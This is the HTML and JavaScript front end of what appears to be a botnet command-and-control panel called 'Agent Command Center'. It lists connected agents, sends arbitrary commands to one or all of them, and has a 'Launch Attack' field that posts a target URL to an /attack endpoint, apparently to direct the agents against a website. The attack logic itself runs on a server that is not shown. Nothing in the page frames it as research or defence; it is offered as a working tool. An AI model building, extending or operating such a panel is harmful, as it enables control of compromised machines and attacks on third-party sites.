<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agent Command Center</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0c0c0c, #1a1a1a);
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            background: linear-gradient(45deg, #1a1a1a, #2d2d2d);
            border: 1px solid #333;
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.03), transparent);
            animation: shimmer 3s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }

        .header h1 {
            font-size: 2.5rem;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradient 3s ease infinite;
            margin-bottom: 10px;
            position: relative;
            z-index: 1;
        }

        @keyframes gradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, #1e1e1e, #2a2a2a);
            border: 1px solid #333;
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: #4ecdc4;
            box-shadow: 0 10px 25px rgba(78, 205, 196, 0.2);
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, transparent, #4ecdc4, transparent);
            animation: slide 2s infinite;
        }

        @keyframes slide {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: bold;
            color: #4ecdc4;
            margin-bottom: 10px;
        }

        .stat-label {
            color: #bbb;
            font-size: 1rem;
        }

        .controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }

        .btn {
            background: linear-gradient(45deg, #2d2d2d, #404040);
            border: 1px solid #555;
            color: white;
            padding: 15px 25px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 14px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.5s;
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
        }

        .btn-success {
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            border-color: #27ae60;
        }

        .btn-success:hover {
            box-shadow: 0 8px 20px rgba(39, 174, 96, 0.4);
        }

        .btn-danger {
            background: linear-gradient(45deg, #e74c3c, #c0392b);
            border-color: #e74c3c;
        }

        .btn-danger:hover {
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .btn-warning {
            background: linear-gradient(45deg, #f39c12, #e67e22);
            border-color: #f39c12;
        }

        .btn-warning:hover {
            box-shadow: 0 8px 20px rgba(243, 156, 18, 0.4);
        }

        .btn-primary {
            background: linear-gradient(45deg, #3498db, #2980b9);
            border-color: #3498db;
        }

        .btn-primary:hover {
            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.4);
        }

        .command-section {
            background: linear-gradient(135deg, #1e1e1e, #2a2a2a);
            border: 1px solid #333;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            position: relative;
        }

        .command-section h3 {
            color: #4ecdc4;
            margin-bottom: 20px;
            font-size: 1.5rem;
        }

        .input-group {
            display: flex;
            gap: 15px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }

        .form-control {
            background: #2d2d2d;
            border: 1px solid #555;
            color: white;
            padding: 12px 15px;
            border-radius: 8px;
            flex: 1;
            min-width: 200px;
            transition: all 0.3s ease;
        }

        .form-control:focus {
            outline: none;
            border-color: #4ecdc4;
            box-shadow: 0 0 10px rgba(78, 205, 196, 0.3);
        }

        select.form-control {
            cursor: pointer;
        }

        .agents-table {
            background: linear-gradient(135deg, #1e1e1e, #2a2a2a);
            border: 1px solid #333;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }

        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #333;
        }

        th {
            background: linear-gradient(45deg, #2d2d2d, #404040);
            color: #4ecdc4;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        tr:hover {
            background: rgba(78, 205, 196, 0.1);
        }

        .status-badge {
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }

        .status-active {
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
        }

        .status-inactive {
            background: linear-gradient(45deg, #95a5a6, #7f8c8d);
            color: white;
        }

        .status-disabled {
            background: linear-gradient(45deg, #e74c3c, #c0392b);
            color: white;
        }

        .logs-section {
            background: linear-gradient(135deg, #1e1e1e, #2a2a2a);
            border: 1px solid #333;
            border-radius: 15px;
            padding: 25px;
        }

        .log-container {
            background: #0f0f0f;
            border: 1px solid #333;
            border-radius: 10px;
            height: 400px;
            overflow-y: auto;
            padding: 15px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 13px;
        }

        .log-entry {
            margin-bottom: 8px;
            padding: 8px;
            border-left: 3px solid #555;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 5px;
        }

        .log-success {
            border-left-color: #27ae60;
            color: #2ecc71;
        }

        .log-error {
            border-left-color: #e74c3c;
            color: #ff6b6b;
        }

        .log-warning {
            border-left-color: #f39c12;
            color: #f1c40f;
        }

        .log-info {
            border-left-color: #3498db;
            color: #74b9ff;
        }

        .timestamp {
            color: #888;
            font-size: 11px;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
        }

        .modal-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, #1e1e1e, #2a2a2a);
            border: 1px solid #333;
            border-radius: 15px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover {
            color: #fff;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 10px;
            color: white;
            font-weight: bold;
            z-index: 1001;
            opacity: 0;
            transform: translateX(100%);
            transition: all 0.3s ease;
        }

        .notification.show {
            opacity: 1;
            transform: translateX(0);
        }

        .notification.success {
            background: linear-gradient(45deg, #27ae60, #2ecc71);
        }

        .notification.error {
            background: linear-gradient(45deg, #e74c3c, #c0392b);
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }

            .header h1 {
                font-size: 2rem;
            }

            .stats-grid {
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            }

            .controls {
                grid-template-columns: 1fr;
            }

            .input-group {
                flex-direction: column;
            }

            .form-control {
                min-width: auto;
            }
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #4ecdc4;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1><i class="fas fa-terminal"></i> Agent Command Center</h1>
            <p>Advanced Multi-Agent Management Dashboard</p>
        </div>

        <!-- Stats Grid -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="activeCount">0</div>
                <div class="stat-label"><i class="fas fa-circle" style="color: #27ae60;"></i> Active Agents</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="inactiveCount">0</div>
                <div class="stat-label"><i class="fas fa-circle" style="color: #95a5a6;"></i> Inactive Agents</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalAgents">0</div>
                <div class="stat-label"><i class="fas fa-network-wired"></i> Total Agents</div>
            </div>
            <div class="stat-card">
                <div class="stat-number pulse" id="serverStatus">ONLINE</div>
                <div class="stat-label"><i class="fas fa-server"></i> Server Status</div>
            </div>
        </div>

        <!-- Control Buttons -->
        <div class="controls">
            <button class="btn btn-success" onclick="resumeServer()">
                <i class="fas fa-play"></i> Resume Server
            </button>
            <button class="btn btn-warning" onclick="pauseServer()">
                <i class="fas fa-pause"></i> Pause Server
            </button>
            <button class="btn btn-primary" onclick="reconnectAll()">
                <i class="fas fa-plug"></i> Reconnect All
            </button>
            <button class="btn btn-danger" onclick="disconnectAll()">
                <i class="fas fa-power-off"></i> Disconnect All
            </button>
            <button class="btn btn-danger" onclick="stopAll()">
                <i class="fas fa-stop"></i> Stop All Tasks
            </button>
            <button class="btn" onclick="refreshData()">
                <i class="fas fa-sync-alt"></i> Refresh Data
            </button>
        </div>

        <!-- Command Section -->
        <div class="command-section">
            <h3><i class="fas fa-terminal"></i> Command Center</h3>
            <div class="input-group">
                <select class="form-control" id="agentSelect">
                    <option value="all">All Agents</option>
                </select>
                <input type="text" class="form-control" id="commandInput" placeholder="Enter command..." />
                <button class="btn btn-primary" onclick="sendCommand()">
                    <i class="fas fa-paper-plane"></i> Send Command
                </button>
            </div>
            
            <div class="input-group">
                <input type="text" class="form-control" id="attackUrl" placeholder="Enter target URL for attack..." />
                <button class="btn btn-danger" onclick="launchAttack()">
                    <i class="fas fa-crosshairs"></i> Launch Attack
                </button>
            </div>
        </div>

        <!-- Agents Table -->
        <div class="agents-table">
            <h3><i class="fas fa-list"></i> Agent Status</h3>
            <table>
                <thead>
                    <tr>
                        <th>Agent ID</th>
                        <th>Status</th>
                        <th>Last Seen</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="agentsTableBody">
                </tbody>
            </table>
        </div>

        <!-- Logs Section -->
        <div class="logs-section">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3><i class="fas fa-clipboard-list"></i> System Logs</h3>
                <button class="btn btn-warning" onclick="clearLogs()">
                    <i class="fas fa-trash"></i> Clear Logs
                </button>
            </div>
            <div class="log-container" id="logContainer">
            </div>
        </div>
    </div>

    <!-- Notification -->
    <div id="notification" class="notification"></div>

    <script>
        let agents = [];
        let logs = [];
        let isServerPaused = false;

        // Initialize dashboard
        document.addEventListener('DOMContentLoaded', function() {
            refreshData();
            setInterval(refreshData, 5000); // Auto refresh every 5 seconds
        });

        // Show notification
        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }

        // Refresh all data
        async function refreshData() {
            try {
                await Promise.all([
                    loadAgents(),
                    loadLogs()
                ]);
                updateStats();
            } catch (error) {
                console.error('Error refreshing data:', error);
                showNotification('Failed to refresh data', 'error');
            }
        }

        // Load agents data
        async function loadAgents() {
            try {
                const response = await fetch('/agents');
                agents = await response.json();
                updateAgentsTable();
                updateAgentSelect();
            } catch (error) {
                console.error('Error loading agents:', error);
            }
        }

        // Load logs data
        async function loadLogs() {
            try {
                const response = await fetch('/logs');
                logs = await response.json();
                updateLogsDisplay();
            } catch (error) {
                console.error('Error loading logs:', error);
            }
        }

        // Update statistics
        function updateStats() {
            const activeAgents = agents.filter(a => a.status === 'active').length;
            const inactiveAgents = agents.filter(a => a.status === 'inactive').length;
            
            document.getElementById('activeCount').textContent = activeAgents;
            document.getElementById('inactiveCount').textContent = inactiveAgents;
            document.getElementById('totalAgents').textContent = agents.length;
            document.getElementById('serverStatus').textContent = isServerPaused ? 'PAUSED' : 'ONLINE';
        }

        // Update agents table
        function updateAgentsTable() {
            const tbody = document.getElementById('agentsTableBody');
            tbody.innerHTML = '';
            
            agents.forEach(agent => {
                const row = document.createElement('tr');
                const statusClass = `status-${agent.status}`;
                
                row.innerHTML = `
                    <td>${agent.id}</td>
                    <td><span class="status-badge ${statusClass}">${agent.status.toUpperCase()}</span></td>
                    <td>${agent.last_seen}</td>
                    <td>
                        ${agent.status === 'disabled' ? 
                            `<button class="btn btn-success btn-sm" onclick="reconnectAgent('${agent.id}')">
                                <i class="fas fa-plug"></i>
                            </button>` :
                            `<button class="btn btn-danger btn-sm" onclick="disconnectAgent('${agent.id}')">
                                <i class="fas fa-power-off"></i>
                            </button>`
                        }
                    </td>
                `;
                tbody.appendChild(row);
            });
        }

        // Update agent select dropdown
        function updateAgentSelect() {
            const select = document.getElementById('agentSelect');
            const currentValue = select.value;
            select.innerHTML = '<option value="all">All Agents</option>';
            
            agents.forEach(agent => {
                const option = document.createElement('option');
                option.value = agent.id;
                option.textContent = agent.id;
                select.appendChild(option);
            });
            
            select.value = currentValue;
        }

        // Update logs display
        function updateLogsDisplay() {
            const container = document.getElementById('logContainer');
            container.innerHTML = '';
            
            logs.slice(0, 50).forEach(log => {
                const div = document.createElement('div');
                div.className = `log-entry log-${log.status}`;
                
                const timestamp = new Date(log.ts * 1000).toLocaleString();
                div.innerHTML = `
                    <div class="timestamp">${timestamp}</div>
                    <div>[${log.type.toUpperCase()}] ${log.message}</div>
                    ${log.agent ? `<div>Agent: ${log.agent}</div>` : ''}
                `;
                
                container.appendChild(div);
            });
            
            // Auto scroll to bottom
            container.scrollTop = container.scrollHeight;
        }

        // Send command
        async function sendCommand() {
            const agent = document.getElementById('agentSelect').value;
            const cmd = document.getElementById('commandInput').value.trim();
            
            if (!cmd) {
                showNotification('Please enter a command', 'error');
                return;
            }
            
            try {
                const response = await fetch('/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent, cmd })
                });
                
                const result = await response.json();
                
                if (result.status === 'success') {
                    showNotification(result.message, 'success');
                    document.getElementById('commandInput').value = '';
                    setTimeout(refreshData, 1000);
                } else {
                    showNotification(result.message, 'error');
                }
            } catch (error) {
                showNotification('Failed to send command', 'error');
            }
        }

        // Launch attack
        async function launchAttack() {
            const url = document.getElementById('attackUrl').value.trim();
            
            if (!url) {
                showNotification('Please enter a target URL', 'error');
                return;
            }
            
            if (!confirm(`Are you sure you want to launch an attack on ${url}?`)) {
                return;
            }
            
            try {
                const response = await fetch('/attack', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url })
                });
                
                const result = await response.json();
                
                if (result.status === 'success') {
                    showNotification(result.message, 'success');
                    document.getElementById('attackUrl').value = '';
                    setTimeout(refreshData, 1000);
                } else {
                    showNotification(result.message, 'error');
                }
            } catch (error) {
                showNotification('Failed to launch attack', 'error');
            }
        }

        // Server control functions
        async function pauseServer() {
            try {
                const response = await fetch('/pause', { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    isServerPaused = true;
                    showNotification('Server paused', 'success');
                    updateStats();
                }
            } catch (error) {
                showNotification('Failed to pause server', 'error');
            }
        }

        async function resumeServer() {
            try {
                const response = await fetch('/resume', { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    isServerPaused = false;
                    showNotification('Server resumed', 'success');
                    updateStats();
                }
            } catch (error) {
                showNotification('Failed to resume server', 'error');
            }
        }

        async function disconnectAll() {
            if (!confirm('Are you sure you want to disconnect all agents?')) {
                return;
            }
            
            try {
                const response = await fetch('/disconnect_all', { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    showNotification(result.msg, 'success');
                    setTimeout(refreshData, 1000);
                }
            } catch (error) {
                showNotification('Failed to disconnect agents', 'error');
            }
        }

        async function reconnectAll() {
            try {
                const response = await fetch('/reconnect_all', { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    showNotification(result.msg, 'success');
                    setTimeout(refreshData, 1000);
                }
            } catch (error) {
                showNotification('Failed to reconnect agents', 'error');
            }
        }

        async function stopAll() {
            if (!confirm('Are you sure you want to stop all running tasks?')) {
                return;
            }
            
            try {
                const response = await fetch('/stop_all', { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    showNotification(result.msg, 'success');
                    setTimeout(refreshData, 1000);
                }
            } catch (error) {
                showNotification('Failed to stop tasks', 'error');
            }
        }

        // Agent control functions
        async function disconnectAgent(agentId) {
            try {
                const response = await fetch(`/disconnect/${agentId}`, { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    showNotification(result.msg, 'success');
                    setTimeout(refreshData, 1000);
                }
            } catch (error) {
                showNotification('Failed to disconnect agent', 'error');
            }
        }

        async function reconnectAgent(agentId) {
            try {
                const response = await fetch(`/reconnect/${agentId}`, { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    showNotification(result.msg, 'success');
                    setTimeout(refreshData, 1000);
                }
            } catch (error) {
                showNotification('Failed to reconnect agent', 'error');
            }
        }

        // Clear logs
        async function clearLogs() {
            if (!confirm('Are you sure you want to clear all logs?')) {
                return;
            }
            
            try {
                const response = await fetch('/clear_logs', { method: 'POST' });
                const result = await response.json();
                
                if (result.status === 'success') {
                    showNotification(result.message, 'success');
                    setTimeout(refreshData, 1000);
                }
            } catch (error) {
                showNotification('Failed to clear logs', 'error');
            }
        }

        // Allow Enter key to send command
        document.getElementById('commandInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendCommand();
            }
        });
